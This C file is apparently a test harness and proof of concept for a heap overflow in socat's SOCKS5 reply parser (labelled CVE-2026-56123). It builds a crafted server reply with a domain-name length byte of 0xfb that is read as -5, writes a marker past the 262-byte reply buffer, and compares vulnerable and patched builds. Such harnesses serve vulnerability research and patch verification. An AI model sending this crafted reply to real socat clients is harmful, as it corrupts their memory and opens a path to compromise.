/*
 * socat2shell — pinned-function harness for CVE-2026-56123.
 *
 * Compiles the verbatim upstream 1.8.1.1 _xioopen_socks5_read_reply() body
 * (src/xio-socks5.inc) against the verbatim 1.8.1.1 struct header, or against
 * the 1.8.1.2 header from the official patch (char -> unsigned char dstdata).
 * Only socat infrastructure that the pinned function touches is standed in:
 * readfull() delivers at most the bytes the malicious server actually sent.
 */
#define WITH_SOCKS5 1
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

struct addrdesc { int unused; };
#include "xio-socks5.h"		/* copied from src/xio-socks5.h.vuln|.fixed */

#define STAT_OK 0
#define STAT_RETRYLATER 1
#define SOCKS5_MAX_REPLY_SIZE 262
#define SOCKS5_ATYPE_IPv4 1
#define SOCKS5_ATYPE_DOMAINNAME 3
#define SOCKS5_ATYPE_IPv6 4

struct single { int fd; };

static unsigned char inbuf[1024];
static size_t inlen;
static int readfull(int fd, void *buf, size_t n, void *opts, int level)
	__attribute__((noinline));

/* Stand-in for socat's readfull(): copy at most the bytes on the wire, in
 * wire order, into the caller's buffer. A negative count arrives here as an
 * implicitly converted size_t, exactly as in the pinned source. */
static int readfull(int fd, void *buf, size_t n, void *opts, int level) {
	(void)fd; (void)opts; (void)level;
	size_t take = n < inlen ? n : inlen;
	if (take != 0) {
		memcpy(buf, inbuf, take);
		inlen -= take;
		memmove(inbuf, inbuf + take, inlen);
	}
	return (int)take;
}

static int Close(int fd) { (void)fd; return 0; }
#define Info(...) ((void)0)
#define Info2(...) ((void)0)
#define Info3(...) ((void)0)
#define Info4(...) ((void)0)
#define Msg(...) ((void)0)
#define Msg1(...) ((void)0)
#define Msg2(...) ((void)0)
#define Msg4(...) ((void)0)
#define Debug(...) ((void)0)
#define Debug1(...) ((void)0)
#define Debug2(...) ((void)0)
#define Debug5(...) ((void)0)

#include "xio-socks5.inc"	/* verbatim upstream lines 414-499 */

/* Five-byte SOCKS5 reply header, then 600 bytes of server-controlled data.
 * The marker sits at reply offset 262, the first byte past the 262-byte
 * allocation made by the real caller (_xioopen_socks5_request, line 551). */
static void fill_input(int safe) {
	const char marker[] = "MISHE-SOCKS";
	memset(inbuf, 0, sizeof(inbuf));
	inbuf[0] = 0x05;			/* SOCKS5_VERSION */
	inbuf[1] = 0x00;			/* success */
	inbuf[2] = 0x00;			/* reserved */
	inbuf[3] = safe ? SOCKS5_ATYPE_IPv4 : SOCKS5_ATYPE_DOMAINNAME;
	inbuf[4] = safe ? 0x01 : 0xfb;		/* signed char: 0xfb -> -5 */
	for (size_t i = 5; i < 605; i++)
		inbuf[i] = (unsigned char)(0x41 + ((i - 5) % 26));
	memcpy(inbuf + 5 + 257, marker, sizeof(marker) - 1);
	inlen = 605;
}

int main(int argc, char **argv) {
	int safe = argc > 1 && strcmp(argv[1], "safe") == 0;
	struct single sfd = { 0 };
#ifdef EXACT_ALLOC
	struct socks5_reply *reply = malloc(SOCKS5_MAX_REPLY_SIZE);
#else
	/* Plain build: keep the bytes past the logical reply in-bounds so the
	 * chosen payload can be read back without an ASan report. */
	struct socks5_reply *reply = calloc(1, SOCKS5_MAX_REPLY_SIZE + 512);
#endif
	int rc;
	if (reply == NULL)
		return 2;
	fill_input(safe);
	rc = _xioopen_socks5_read_reply(&sfd, reply, 1);
	printf("variant=attack=%d rc=%d\n", !safe, rc);
#ifndef EXACT_ALLOC
	if (!safe) {
		printf("canary=");
		for (int i = SOCKS5_MAX_REPLY_SIZE;
		     i < SOCKS5_MAX_REPLY_SIZE + 12; i++)
			printf("%02x", ((unsigned char *)reply)[i]);
		printf("\n");
	}
#endif
	free(reply);
	return 0;
}
